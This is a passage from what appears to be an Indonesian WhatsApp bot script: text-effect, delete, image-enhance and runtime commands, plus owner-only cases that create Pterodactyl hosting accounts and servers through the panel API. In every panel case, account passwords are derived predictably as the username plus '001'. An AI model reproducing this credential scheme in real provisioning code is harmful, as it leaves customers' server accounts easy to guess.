if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
ZetInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
uselimit()
}
break      
        
case 'delete': case 'del': case 'd':{
 if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
ZetInc.sendMessage(m.chat, { delete: key })
}
break
        
case "enhancer":
case "unblur":
case "enhance":
case "hdr":
case "hd":
case "remini":{
ZetInc.enhancer = ZetInc.enhancer ? ZetInc.enhancer : {};
if (m.sender in ZetInc.enhancer)
return ZetInc.reply(m.chat, "Masih Ada Proses Yang Belum Selesai Kak, Silahkan Tunggu Sampai Selesai Yah >//<", m)
let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || q.mediaType || "";
if (!mime)
return ZetInc.reply(m.chat, `Send/Reply Images with the caption *${prefix + command}`, m)
if (!/image\/(jpe?g|png)/.test(mime))
return ZetInc.reply(m.chat, `Mime ${mime} tidak support`, m)
else ZetInc.enhancer[m.sender] = true;
ZetInc.sendMessage(m.chat, {
react: {
text: '🕒',
key: m.key,
}
});
let img = await q.download?.();
let error;
try {
const This = await remini(img, "enhance");
ZetInc.sendMessage(m.chat, {
react: {
text: '☑️',
key: m.key,
}
});
ZetInc.sendFile(m.chat, This, "", "```Success...```", m);
} catch (er) {
error = true;
} finally {
if (error) {
ZetInc.reply(m.chat, "Proses Gagal :(", m)
}
delete ZetInc.enhancer[m.sender];
}
}
break;
        
case'runtime':{
let muptime = runtime(process.uptime()).trim()
await zreply('```Online Selama : ```' + muptime)
}
break
        
case'buypanel':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} username nomor`)
ZetInc.sendList(m.chat, "Berikut List Ram Panel Yang Tersedia", "Powered By KyuuRzy", {
                    title: 'List Ram', sections: [{
                        title: "silahkan Pilih Ram Yang Tersedia",
                        rows: [
                            {
                                title: "Panel 1gb",
                                description: "📦 Panel Pterodactyl 1GB",
                                id: `.1gb ${text}`
                            },
                            {
                                title: "panel 2gb",
                                description: "📦 Panel Pterodactyl 2GB",
                                id: `.2gb ${text}`
                            },
                            {
                                title: "panel 3gb",
                                description: "📦 Panel Pterodactyl 3GB",
                                id: `.3gb ${text}`
                            },
                            {
                                title: "panel 4gb",
                                description: "📦 Panel Pterodactyl 4GB",
                                id: `.4gb ${text}`
                            },
                            {
                                title: "panel 5gb",
                                description: "📦 Panel Pterodactyl 5GB",
                                id: `.5gb ${text}`
                            },
                            {
                                title: "panel 6gb",
                                description: "📦 Panel Pterodactyl 6GB",
                                id: `.6gb ${text}`
                            },
                            {
                                title: "panel 7gb",
                                description: "📦 Panel Pterodactyl 7GB",
                                id: `.7gb ${text}`
                            },
                            {
                                title: "panel 8gb",
                                description: "📦 Panel Pterodactyl 8GB",
                                id: `.8gb ${text}`
                            },
                            {
                                title: "panel Unli",
                                description: "📦 Panel Pterodactyl Unlimited",
                                id: `.unli ${text}`
                            }
                        ]
                    }]
                })
}
break
        
case "1gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "1048"
let cpu = "50"
let disk = "1000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break        
        
case "2gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "2048"
let cpu = "75"
let disk = "2000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
 
case "3gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "3048"
let cpu = "100"
let disk = "3000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case "4gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break

case "5gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "5048"
let cpu = "150"
let disk = "5000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case "6gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "6048"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case "7gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "7048"
let cpu = "200"
let disk = "7000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case "8gb": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "8048"
let cpu = "225"
let disk = "8000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case "unli": {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ZetInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
zreply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ZetInc, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
